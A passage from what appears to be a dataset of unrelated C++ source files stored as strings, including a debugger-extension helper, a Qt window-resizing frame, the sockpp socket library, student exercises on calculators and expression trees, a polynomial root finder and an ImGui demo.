});\r\n\t\t\t}\r\n\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\r\n\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, kind });\r\n\t\tc = end;\r\n\t}\r\n\r\n\tfor (Token& token : tokens)\r\n\t{\r\n\t\ttoken.print();\r\n\t}\r\n}",
    "#include \"Utils.h\"\n#include \"InterfaceWrapper.h\"\n#include <DbgEng.h>\n#include <ranges>\n#include <algorithm>\n\nnamespace srcsync\n{\n\textern srcsync::InterfaceWrapper<PDEBUG_CONTROL> g_DebugControl;\n\textern srcsync::InterfaceWrapper<PDEBUG_SYMBOLS> g_DebugSymbols;\n\n\tstatic bool ICharEquals(char a, char b)\n\t{\n\t\treturn std::tolower(a) == std::tolower(b);\n\t}\n\n\tstatic bool IEqual(std::string_view First, std::string_view Second)\n\t{\n\t\treturn std::ranges::equal(First, Second, ICharEquals);\n\t}\n\n\tstd::vector<size_t> GetCallstack()\n\t{\n\t\tstd::vector<size_t> result{};\n\t\tstd::vector<DEBUG_STACK_FRAME> stackFrames(100);\n\t\tULONG framesFilled{};\n\n\t\tg_DebugControl->GetStackTrace(0, 0, 0, stackFrames.data(), 100, &framesFilled);\n\n\t\tfor (size_t i{}; i < framesFilled; ++i)\n\t\t{\n\t\t\tresult.push_back(stackFrames[i].InstructionOffset);\n\t\t}\n\n\t\treturn result;\n\t}\n\n\tstd::string GetSymbolsPath()\n\t{\n\t\tULONG pathSize{};\n\t\tg_DebugSymbols->GetSymbolPath(nullptr, 0, &pathSize);\n\n\t\tif (!pathSize)\n\t\t{\n\t\t\treturn {};\n\t\t}\n\n\t\tstd::string result(pathSize, '\\x00');\n\t\tif (FAILED(g_DebugSymbols->GetSymbolPath(result.data(), static_cast<ULONG>(result.size()), &pathSize)))\n\t\t{\n\t\t\treturn {};\n\t\t}\n\n\t\treturn result;\n\t}\n\n\tbool PrependSymbolsPath(std::string_view PathToPrepend)\n\t{\n\t\tauto symbolPath = GetSymbolsPath();\n\t\tif (symbolPath.contains(PathToPrepend))\n\t\t{\n\t\t\treturn true;\n\t\t}\n\n\t\tsymbolPath = std::string{ PathToPrepend.data() } + \";\" + symbolPath;\n\n\t\treturn SUCCEEDED(g_DebugSymbols->SetSymbolPath(symbolPath.data()));\n\t}\n\n\tstd::pair<size_t, size_t> GetModuleAddressRange(std::string_view Name)\n\t{\n\t\tULONG loadedModules{};\n\t\tULONG unloadedModules{};\n\t\tif (FAILED(g_DebugSymbols->GetNumberModules(&loadedModules, &unloadedModules)))\n\t\t{\n\t\t\treturn {};\n\t\t}\n\n\t\tfor (ULONG i{}; i < loadedModules; ++i)\n\t\t{\n\t\t\tstd::string imageName(500, '\\x00');\n\t\t\tstd::string moduleName(500, '\\x00');\n\n\t\t\tg_DebugSymbols->GetModuleNames(i, 0,\n\t\t\t\timageName.data(), static_cast<ULONG>(imageName.size()), nullptr,\n\t\t\t\tmoduleName.data(), static_cast<ULONG>(moduleName.size()), nullptr,\n\t\t\t\tnullptr, 0, nullptr);\n\n\t\t\timageName.resize(std::strlen(imageName.data()));\n\t\t\tmoduleName.resize(std::strlen(moduleName.data()));\n\n\t\t\tif (!IEqual(Name, imageName) && !IEqual(Name, moduleName))\n\t\t\t{\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tsize_t moduleBase{};\n\t\t\tif (FAILED(g_DebugSymbols->GetModuleByModuleName(moduleName.data(), 0, nullptr, &moduleBase)))\n\t\t\t{\n\t\t\t\treturn {};\n\t\t\t}\n\n\t\t\tDEBUG_MODULE_PARAMETERS debugModuleParameters{};\n\t\t\tif (FAILED(g_DebugSymbols->GetModuleParameters(1, &moduleBase, 0, &debugModuleParameters)))\n\t\t\t{\n\t\t\t\treturn {};\n\t\t\t}\n\n\t\t\treturn { debugModuleParameters.Base, debugModuleParameters.Base + debugModuleParameters.Size };\n\t\t}\n\n\t\treturn {};\n\t}\n\n\tstd::string GetHostIpAndPort()\n\t{\n\t\tconst std::string defaultIpAndPort{ \"localhost:5111\" };\n\n\t\tstd::string userProfile(MAX_PATH, 0);\n\t\tauto count = GetEnvironmentVariableA(\"userprofile\", userProfile.data(), static_cast<uint32_t>(userProfile.size()));\n\t\tif (!count || count >= MAX_PATH)\n\t\t{\n\t\t\treturn defaultIpAndPort;\n\t\t}\n\t\tuserProfile.resize(count);\n\t\tuserProfile += R\"(\\.srcsync)\";\n\n\t\tstd::string ip(16, 0);\n\t\tcount = GetPrivateProfileStringA(\"INTERFACE\", \"host\", \"127.0.0.1\", ip.data(), MAX_PATH, userProfile.data());\n\t\tif (!count || count >= MAX_PATH)\n\t\t{\n\t\t\treturn defaultIpAndPort;\n\t\t}\n\t\tip.resize(count);\n\n\t\tstd::string port(6, 0);\n\t\tcount = GetPrivateProfileStringA(\"INTERFACE\", \"port\", \"5111\", port.data(), MAX_PATH, userProfile.data());\n\t\tif (!count || count >= MAX_PATH)\n\t\t{\n\t\t\treturn defaultIpAndPort;\n\t\t}\n\t\tport.resize(count);\n\n\t\treturn ip + \":\" + port;\n\t}\n\n}",
    "#include \"resizableframe.h\"\n\nResizableFrame::ResizableFrame(QWidget *parent) : QFrame(parent) { setMouseTracking(true); }\n\nvoid ResizableFrame::mousePressEvent(QMouseEvent *event)\n{\n    if (event->button() == Qt::LeftButton && startPos != none) {\n        dragStartPosition = event->pos();\n        dragStartGeometry = window()->geometry();\n    }\n}\n\nvoid ResizableFrame::mouseMoveEvent(QMouseEvent *event)\n{\n    if (!(event->buttons()) && !(window()->isMaximized())) {\n        if (event->pos().x() <= 5 && event->pos().y() <= 6) {\n            startPos = topLeft;\n            setCursor(Qt::SizeFDiagCursor);\n        } else if (event->pos().x() <= 8 && event->pos().y() >= height() - 8) {\n            startPos = bottomLeft;\n            setCursor(Qt::SizeBDiagCursor);\n        } else if (event->pos().x() >= width() - 6 && event->pos().y() <= 6) {\n            startPos = topRight;\n            setCursor(Qt::SizeBDiagCursor);\n        } else if (event->pos().x() >= width() - 8 && event->pos().y() >= height() - 8) {\n            startPos = bottomRight;\n            setCursor(Qt::SizeFDiagCursor);\n        } else if (event->pos().x() <= 5) {\n            startPos = left;\n            setCursor(Qt::SizeHorCursor);\n        } else if (event->pos().x() >= width() - 6) {\n            startPos = right;\n            setCursor(Qt::SizeHorCursor);\n        } else if (event->pos().y() <= 5) {\n            startPos = top;\n            setCursor(Qt::SizeVerCursor);\n        } else if (event->pos().y() >= height() - 5) {\n            startPos = bottom;\n            setCursor(Qt::SizeVerCursor);\n        } else {\n            startPos = none;\n            setCursor(Qt::ArrowCursor);\n        }\n        return;\n    }\n    else if (event->buttons() & Qt::LeftButton) {\n        switch (startPos) {\n        case topLeft:\n            window()->setGeometry(QRect(QPoint((window()->width() - event->pos().x() >= window()->minimumWidth() && window()->width() - (event->pos().x() - dragStartPosition.x()) <= window()->screen()->size().width() && window()->width() - (event->pos().x() - dragStartPosition.x()) <= window()->maximumWidth()) ? qMax(event->globalPosition().toPoint().x() - dragStartPosition.x(), 0) : window()->geometry().left(),\n                                               (window()->height() - event->pos().y() >= window()->minimumHeight() && window()->height() - (event->pos().y() - dragStartPosition.y()) <= window()->screen()->availableSize().height() && window()->height() - (event->pos().y() - dragStartPosition.y()) <= window()->maximumHeight()) ? qMax(event->globalPosition().toPoint().y() - dragStartPosition.y(), 0) : window()->geometry().top()),\n                                        QPoint(dragStartGeometry.right(), dragStartGeometry.bottom())));\n            break;\n\n        case bottomLeft:\n            window()->setGeometry(QRect(QPoint((window()->width() - event->pos().x() >= window()->minimumWidth() && window()->width() - (event->pos().x() - dragStartPosition.x()) <= window()->screen()->size().width() && window()->width() - (event->pos().x() - dragStartPosition.x()) <= window()->maximumWidth()) ? qMax(event->globalPosition().toPoint().x() - dragStartPosition.x(), 0) : window()->geometry().left(), dragStartGeometry.top()),\n                                        QPoint(dragStartGeometry.right(), (event->pos().y() + dragStartGeometry.height() - dragStartPosition.y() <= window()->screen()->availableSize().height() && event->pos().y() + dragStartGeometry.height() - dragStartPosition.y() <= window()->maximumHeight()) ? qMin(event->globalPosition().toPoint().y() + dragStartGeometry.height() - dragStartPosition.y(), window()->screen()->availableSize().height()) : window()->geometry().bottom())));\n            break;\n\n        case topRight:\n            window()->setGeometry(QRect(QPoint(dragStartGeometry.left(), (window()->height() - event->pos().y() >= window()->minimumHeight() && window()->height() - event->pos().y() + dragStartPosition.y() <= window()->screen()->availableSize().height() && window()->height() - event->pos().y() + dragStartPosition.y() <= window()->maximumHeight()) ? qMax(event->globalPosition().toPoint().y() - dragStartPosition.y(), 0) : window()->geometry().top()),\n                                        QPoint((event->pos().x() + dragStartGeometry.width() - dragStartPosition.x() <= window()->screen()->size().width() && event->pos().x() + dragStartGeometry.width() - dragStartPosition.x() <= window()->maximumWidth()) ? qMin(event->globalPosition().toPoint().x() + dragStartGeometry.width() - dragStartPosition.x(), window()->screen()->size().width()) : window()->geometry().right(), dragStartGeometry.bottom())));\n            break;\n\n        case bottomRight:\n            window()->setGeometry(QRect(QPoint(dragStartGeometry.left(), dragStartGeometry.top()),\n                                        QPoint((event->pos().x() + dragStartGeometry.width() - dragStartPosition.x() <= window()->screen()->size().width() && event->pos().x() + dragStartGeometry.widt",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// socket.cpp\n//\n// --------------------------------------------------------------------------\n// This file is part of the \"sockpp\" C++ socket library.\n//\n// Copyright (c) 2014-2023 Frank Pagliughi\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// 1. Redistributions of source code must retain the above copyright notice,\n// this list of conditions and the following disclaimer.\n//\n// 2. Redistributions in binary form must reproduce the above copyright\n// notice, this list of conditions and the following disclaimer in the\n// documentation and/or other materials provided with the distribution.\n//\n// 3. Neither the name of the copyright holder nor the names of its\n// contributors may be used to endorse or promote products derived from this\n// software without specific prior written permission.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\n// THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\n// PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR\n// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n// EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n// --------------------------------------------------------------------------\n\n#include \"sockpp/socket.h\"\n\n#include <fcntl.h>\n\n#include <algorithm>\n#include <cstring>\n\n#include \"sockpp/error.h\"\n\nusing namespace std::chrono;\n\nnamespace sockpp {\n\n/////////////////////////////////////////////////////////////////////////////\n// Some aux functions\n\ntimeval to_timeval(const microseconds& dur) {\n    const seconds sec = duration_cast<seconds>(dur);\n\n    timeval tv;\n#if defined(_WIN32)\n    tv.tv_sec = long(sec.count());\n#else\n    tv.tv_sec = time_t(sec.count());\n#endif\n    tv.tv_usec = suseconds_t(duration_cast<microseconds>(dur - sec).count());\n    return tv;\n}\n\n/////////////////////////////////////////////////////////////////////////////\n//\t\t\t\t\t\t\tsocket_initializer\n/////////////////////////////////////////////////////////////////////////////\n\nsocket_initializer::socket_initializer() {\n#if defined(_WIN32)\n    WSADATA wsadata;\n    ::WSAStartup(MAKEWORD(2, 0), &wsadata);\n#else\n    // Don't signal on socket write errors.\n    ::signal(SIGPIPE, SIG_IGN);\n#endif\n}\n\nsocket_initializer::~socket_initializer() {\n#if defined(_WIN32)\n    ::WSACleanup();\n#endif\n}\n\n// --------------------------------------------------------------------------\n\nvoid initialize() { socket_initializer::initialize(); }\n\n/////////////////////////////////////////////////////////////////////////////\n//\t\t\t\t\t\t\t\t\tsocket\n/////////////////////////////////////////////////////////////////////////////\n\nresult<> socket::close(socket_t h) noexcept {\n#if defined(_WIN32)\n    return check_res_none(::closesocket(h));\n#else\n    return check_res_none(::close(h));\n#endif\n}\n\n// --------------------------------------------------------------------------\n\nresult<socket> socket::create(int domain, int type, int protocol /*=0*/) noexcept {\n    socket sock(::socket(domain, type, protocol));\n    if (!sock)\n        return result<socket>::from_last_error();\n    return sock;\n}\n\n// --------------------------------------------------------------------------\n// TODO: result<socket>?\n\nsocket socket::clone() const {\n    socket_t h = INVALID_SOCKET;\n#if defined(_WIN32)\n    WSAPROTOCOL_INFOW protInfo;\n    if (::WSADuplicateSocketW(handle_, ::GetCurrentProcessId(), &protInfo) == 0)\n        h = check_socket(\n            ::WSASocketW(AF_INET, SOCK_STREAM, 0, &protInfo, 0, WSA_FLAG_OVERLAPPED)\n        ).value();\n#else\n    h = ::dup(handle_);\n#endif\n\n    return socket(h);\n}\n\n// --------------------------------------------------------------------------\n\n#if !defined(_WIN32)\n\nresult<int> socket::get_flags() const { return check_res(::fcntl(handle_, F_GETFL, 0)); }\n\nresult<> socket::set_flags(int flags) {\n    return check_res_none(::fcntl(handle_, F_SETFL, flags));\n}\n\nresult<> socket::set_flag(int flag, bool on /*=true*/) {\n    auto res = get_flags();\n    if (!res) {\n        return res.error();\n    }\n\n    int flags = res.value();\n    flags = on ? (flags | flag) : (flags & ~flag);\n    return set_flags(flags);\n}\n\n// TODO: result<bool>?\nbool socket::is_non_blocking() const {\n    auto res = get_flags();\n    return (res) ? ((res.value() & O_NONBLOCK) != 0) : false;\n}\n\n#endif\n\n// --------------------------------------------------------------------------\n\nresult<std::tuple<socket, socket>>\nsocket::pair(int dom",
    "/******************************************************************************\n\n    C++ Script License - Version 1.0\n    Author: Gayan Brahmanage, Ph.D.\n    Contact: gayansampathefac@gmail.com\n    LinkedIn: https://www.linkedin.com/in/gayan-brahmanage/\n    GitHub: https://github.com/gayanbrahmanage\n\n    This C++ script is licensed under the terms of the MIT license. Please see\n    the following terms and conditions:\n\n    Permission is hereby granted, free of charge, to any person obtaining a copy\n    of this software and associated documentation files (the \"Software\"), to deal\n    in the Software without restriction, including without limitation the rights\n    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n    copies of the Software, and to permit persons to whom the Software is\n    furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be included in\n    all copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n    THE SOFTWARE.\n\n******************************************************************************/\n\n#include \"parameters.h\"\n\nparameters::parameters(){\n\n}\n\nparameters::~parameters(){\n\n}\n",
    "#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    char choice;\r\n    double num1, num2;\r\n    do {\r\n        cout << \"Enter first number: \";\r\n        cin >> num1;\r\n\r\n        cout << \"Enter second number: \";\r\n        cin >> num2;\r\n\r\n        cout << \"Arithmetic Menu:\" << endl;\r\n        cout << \"1. Addition\" << endl;\r\n        cout << \"2. Subtraction\" << endl;\r\n        cout << \"3. Multiplication\" << endl;\r\n        cout << \"4. Division\" << endl;\r\n\r\n     }\r\n\r\n     while(choice == 'y'|| choice == 'Y');\r\n     cout<< \"Exit the program\"<< endl;\r\n\r\n    return 0;\r\n\r\n\r\n       switch(choice){\r\n         case 1:\r\n          cout<<\"Result:\" << \"num1 + num2\" <<endl;\r\n          break;\r\n\r\n           case 2:\r\n          cout<<\"Result:\" << \"num1 - num2\" <<endl;\r\n          break;\r\n\r\n           case 3:\r\n          cout<<\"Result:\" << \"num1 * num2\" <<endl;\r\n          break;\r\n\r\n           case 4:\r\n            if(num2 ==0){\r\n              cout<<\"Result:\" << \"The second integer is zero ,divide by zero.\"<<endl;\r\n        }\r\n        else{\r\n            cout<<\"Result:\"<< num1/num2 <<endl;\r\n\r\n        }\r\n        break;\r\n           default:\r\n            cout <<\"invalid choie ! please chooce again.\"<< endl;\r\n        }\r\n\r\n}\r\n",
    "Practical No: 05\r\r\nTitle : A C++ Program to Create and Display an Expression Tree\r\r\n Input : Postfix Expression\r\r\n Output: Preorder, Inorder and Postorder Traversal of Expression Tree\r\r\n*/\r\r\n //.........Header Files\r\r\n#include <iostream>\r\r\nusing namespace std;\r\r\n //.........Input to Program\r\r\nchar postfix[10];\r\r\n //.........Node of Expression Tree\r\r\nstruct Node\r\r\n{\r\r\n char data;\r\r\n struct Node *left;\r\r\n struct Node *right;\r\r\n}*Root;\r\r\n //.......Stack to store Pointers of Nodes\r\r\nstruct Node* stack[5];\r\r\nint top = -1;\r\r\n //......To push Pointers in Stack\r\r\nvoid push_stk(struct Node *newnode) \r\r\n{\r\r\n top++;\r\r\n stack[top] = newnode;\r\r\n}\r\r\n //......To pop Pointers from Stack\r\r\nstruct Node* pop_stk()\r\r\n{\r\r\n struct Node *temp;\r\r\n \r\r\n temp = stack[top];\r\r\n top--;\r\r\n \r\r\n return temp;\r\r\n}\r\n//.........Function to Create New Node \r\r\nstruct Node* create_Node(char val)\r\r\n{\r\r\n struct Node *Newnode;\r\r\n \r\r\n Newnode = new struct Node;\r\r\n \r\r\n Newnode->data = val;\r\r\n Newnode->left = NULL;\r\r\n Newnode->right = NULL;\r\r\n \r\r\n return Newnode;\r\r\n}\r\r\n \r\r\n //.........Function to Create an Expression Tree\r\r\nvoid create_Exptree()\r\r\n{\r\r\n int i;\r\r\n \r\r\n struct Node *Newnode;\r\r\n \r\r\n cout<<\"\\n\\n Enter the Postfix Expression: \";\r\r\n cin>>postfix;\r\r\n \r\r\n for(i=0; postfix[i] != '\\0'; i++)\r\r\n { //.....If Operand\r\r\n if(postfix[i] == 'a' || postfix[i] == 'b' || postfix[i] == 'c' || postfix[i] == 'd')\r\r\n {\r\r\n //........Create New Node for Operand\r\r\n Newnode = create_Node(postfix[i]); \r\r\n //........Push Operand in Stack\r\r\n push_stk(Newnode);\r\r\n }\r\r\n//.....If Operator\r\r\n if(postfix[i] == '+' || postfix[i] == '-' || postfix[i] == '*' || postfix[i] == '/')\r\r\n {\r\r\n //........Create New Node for Operator\r\r\n Newnode = create_Node(postfix[i]);\r\r\n //........Pop An Operand from stack and attach as Right Child\r\r\n Newnode->right = pop_stk(); \r\r\n //........Pop An Operand from stack and attach as left Child\r\r\n Newnode->left = pop_stk(); \r\r\n \r\r\n push_stk(Newnode);\r\r\n }\r\r\n }\r\n { //........Pop a Pointer from Stack and Assign to Root.\r\r\n Root = pop_stk();\r\r\n cout<<\"\\n\\t Expression Tree is Ready Now...!!!\";\r\r\n }\r\r\n}\r\r\n \r\r\n //.........Function to display Expression Tree in Preorder \r\r\nvoid preorder_ExpTree(struct Node *root)\r\r\n{\r\r\n if(root)\r\r\n {\r\r\n cout<<\" \"<<root->data; //....Data\r\r\n preorder_ExpTree(root->left); //....Left\r\r\n preorder_ExpTree(root->right); //....Right\r\r\n }\r\r\n} \r\r\n \r\r\n //.........Function to display Expression Tree in Inorder\r\r\nvoid inorder_ExpTree(struct Node *root)\r\r\n{\r\r\n if(root)\r\r\n {\r\r\n inorder_ExpTree(root->left); //....Left\r\r\n cout<<\" \"<<root->data; //....Data\r\r\n inorder_ExpTree(root->right); //....Right\r\r\n }\r\r\n}\r\r\n \r\r\n //.........Function to display Expression Tree in Postorder\r\r\nvoid postorder_ExpTree(struct Node *root)\r\r\n{\r\r\n if(root)\r\r\n {\r\r\n postorder_ExpTree(root->left); //....Left\r\r\n postorder_ExpTree(root->right); //....Right\r\r\n cout<<\" \"<<root->data; //....Data\r\r\n }\r\r\n} \r\r\n //.........Main Function\r\r\nint main()\r\r\n{\r\r\n cout<<\"---------*** A C++ Program to Create and Display an Expression Tree*** \r\r\n---------\";\r\r\n Root = NULL;\r\n create_Exptree();\r\r\n \r\r\n cout<<\"\\n\\n Preorder Traversal of Expression Tree: \";\r\r\n preorder_ExpTree(Root);\r\r\n \r\r\n cout<<\"\\n\\n Inorder Traversal of Expression Tree: \";\r\r\n inorder_ExpTree(Root);\r\r\n \r\r\n cout<<\"\\n\\n Postorder Traversal of Expression Tree: \";\r\r\n postorder_ExpTree(Root);\r\r\n return 0;\r\r\n}\r\r\n/*--------------------------OUTPUT------------------------------\r\r\n---------*** A C++ Program to Create and Display an Expression Tree*** ---------\r\r\n Enter the Postfix Expression: ab+\r\r\n Expression Tree is Ready Now...!!!\r\r\n Preorder Traversal of Expression Tree: + a b\r\r\n Inorder Traversal of Expression Tree: a + b\r\r\n Postorder Traversal of Expression Tree: a b +\r\r\n ---------*** A C++ Program to Create and Display an Expression Tree*** ---------\r\r\n Enter the Postfix Expression: ab+cd-*\r\r\n Expression Tree is Ready Now...!!!\r\r\n Preorder Traversal of Expression Tree: * + a b - c d\r\r\n Inorder Traversal of Expression Tree: a + b * c - d\r\r\n Postorder Traversal of Expression Tree: a b + c d - *\r\n *** A C++ Program to Create and Display an Expression Tree*** ---------\r\r\n Enter the Postfix Expression: ab+c*\r\r\n Expression Tree is Ready Now...!!!\r\r\n Preorder Traversal of Expression Tree: * + a b c\r\r\n Inorder Traversal of Expression Tree: a + b * c\r\r\n Postorder Traversal of Expression Tree: a b + c *\r\r\n...Program finished with exit code 0\r\r\nPress ENTER to exit console.\r\r\n*/",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\ndouble horner(vector<double> coeffs, double x) {\r\n    double res = 0;\r\n    for(int i=0 ; i<coeffs.size() ; i++){       //horner f(x) = ...\r\n        res = res*x + coeffs[i];\r\n    } \r\n    return res;\r\n}\r\n\r\ndouble derivFunc(vector<double> coeffs, double x) {\r\n    double result = 0;\r\n    for (int i = 0; i < coeffs.size() - 1; ++i) {\r\n        result += coeffs[i] * (coeffs.size() - 1 - i) * pow(x, coeffs.size() - 2 - i);\r\n    }\r\n    return result;\r\n}\r\n\r\nvector<double> synthDiv(vector<double> coeffs, double root) {\r\n    int n = coeffs.size();\r\n    vector<double> newCoeffs(n - 1);\r\n    newCoeffs[0] = coeffs[0];\r\n    for (int i = 1; i < n - 1; ++i) {\r\n        newCoeffs[i] = coeffs[i] + newCoeffs[i - 1] * root;\r\n    }\r\n    return newCoeffs;\r\n}\r\n\r\nint main() {\r\n    vector<double> coeffs = {3,-8,2,5,-1};\r\n    double x = 4,f1,f2;\r\n    double err = 0.000001;\r\n    int n = coeffs.size() - 1;\r\n    int ct=0;\r\n    int it=0;\r\n    while (n > 1) {\r\n        double e;\r\n        do {\r\n            f1 = horner(coeffs, x);\r\n            f2 = derivFunc(coeffs, x);\r\n            double x1 = x - (f1 / f2);\r\n            e = fabs(x1 - x);\r\n            x = x1;\r\n            it++;\r\n        } while (e > err);\r\n         ct++;\r\n\r\n        //cout << \"iteration :\"<< it <<\" Root found\" << ct <<\":\" << x  << endl;\r\n        cout << \"root \"<< ct <<\": \"<<x<<\", iteration No: \"<<it<<\", \";\r\n        cout << \"f(x) = \"<<f1<<\",  f'(x) = \"<<f2<<endl;\r\n\r\n        coeffs = synthDiv(coeffs, x);\r\n        n = coeffs.size() - 1;\r\n    }\r\n    \r\n    double finalRoot = -coeffs[1] / coeffs[0];\r\n\r\n    //cout << \"iteration :\"<< it << \"  Final root\"<<ct+1 <<\":\"<< -coeffs[1] / coeffs[0] << endl;\r\n    cout << \"root \"<<++ct<<\": \"<<finalRoot<<\", iteration No: \"<<++it<<\", \";\r\n    cout << \"f(x) = \"<<horner(coeffs, finalRoot)<<\",  f'(x) = \"<<derivFunc(coeffs,finalRoot)<<endl;\r\n    \r\n\r\n    return 0;\r\n}",
    "#include <Pentagram.hpp>\n\nfloat rgb[] = {1, 0, 0};\nint step = 5;\nbool showDemoWindow = true;\nglm::vec2 movment = {0, 0};\n\nvoid eventCallback(PNT::Window *window, PNT::windowEvent event) {\n    if(event.eventType == PNT_EVENT_TYPE_KEYBOARD) {\n        switch(event.keyboardEvent.key) {\n        case GLFW_KEY_1:\n            rgb[0] = 1;\n            rgb[1] = 0;\n            rgb[2] = 0;\n            break;\n\n        case GLFW_KEY_2:\n            rgb[0] = 0;\n            rgb[1] = 0;\n            rgb[2] = 1;\n            break;\n\n        case GLFW_KEY_BACKSPACE:\n            window->setPosition(700, 500);\n            break;\n\n        case GLFW_KEY_EQUAL:\n            if(step < 20) step++;\n            break;\n\n        case GLFW_KEY_MINUS:\n            if(step > 1) step--;\n            break;\n\n        case GLFW_KEY_RIGHT:\n            if(event.keyboardEvent.action == GLFW_PRESS) movment[0] += 1;\n            if(event.keyboardEvent.action == GLFW_RELEASE) movment[0] += -1;\n            break;\n\n        case GLFW_KEY_LEFT:\n            if(event.keyboardEvent.action == GLFW_PRESS) movment[0] += -1;\n            if(event.keyboardEvent.action == GLFW_RELEASE) movment[0] += 1;\n            break;\n\n        case GLFW_KEY_UP:\n            if(event.keyboardEvent.action == GLFW_PRESS) movment[1] += -1;\n            if(event.keyboardEvent.action == GLFW_RELEASE) movment[1] += 1;\n            break;\n\n        case GLFW_KEY_DOWN:\n            if(event.keyboardEvent.action == GLFW_PRESS) movment[1] += 1;\n            if(event.keyboardEvent.action == GLFW_RELEASE) movment[1] += -1;\n            break;\n        }\n        window->setPosition(window->getWindowData().xpos + (movment[0] * step), window->getWindowData().ypos + (movment[1] * step));\n    }\n}\n\nvoid startFrameCallback(PNT::Window *window) {\n    // Set background color.\n    window->setClearColor(rgb[0], rgb[1], rgb[2], 1);\n\n    // ImGui GUI.\n    ImGui::Begin(\"Demo Controls\");\n\n    // Clear Color.\n    ImGui::Text(\"Background Color: \");\n    ImGui::ColorPicker3(\"##ColorPicker3 0\", rgb, ImGuiColorEditFlags_InputRGB);\n    ImGui::Text(\"Reposition Step: \");\n    ImGui::SameLine();\n    ImGui::SliderInt(\"##SliderInt 0\", &step, 1, 20, \"%d\", ImGuiSliderFlags_AlwaysClamp);\n\n    // Demo Window.\n    if(ImGui::Button(showDemoWindow ? \"Hide Demo Window ##Button 0\" : \"Show Demo Window ##Button 0\")) showDemoWindow = !showDemoWindow;\n    if(showDemoWindow) ImGui::ShowDemoWindow(&showDemoWindow);\n\n    ImGui::End();\n}\n\nint main(int argc, char *argv[]) {\n    // Initilize.\n    PNT::init();\n\n    // Creating window\n    PNT::Window window(\"Demo Window\", 600, 600, 700, 400, ImGuiConfigFlags_ViewportsEnable | ImGuiConfigFlags_DockingEnable);\n    PNT::image image(\"D:/Repositories/Pentagram-Demo/logo.png\");\n    if(!image.validate()) {\n        std::cout << stbi_failure_reason();\n        exit(1);\n    }\n    window.setIcon(image);\n\n    // Setting callbackss\n    window.setCallback(PNT_CALLBACK_FLAGS_STARTFRAME, &startFrameCallback);\n    window.setEventCallback(&eventCallback);\n\n    // App loop\n    while(!window.shouldClose()) {\n        // Event processing.\n        PNT::processEvents();\n\n        // Start and end frame.\n        window.startFrame();\n        window.endFrame();\n    }\n\n    // Shutdown.\n    PNT::deinit();\n    return 0;\n}\n",
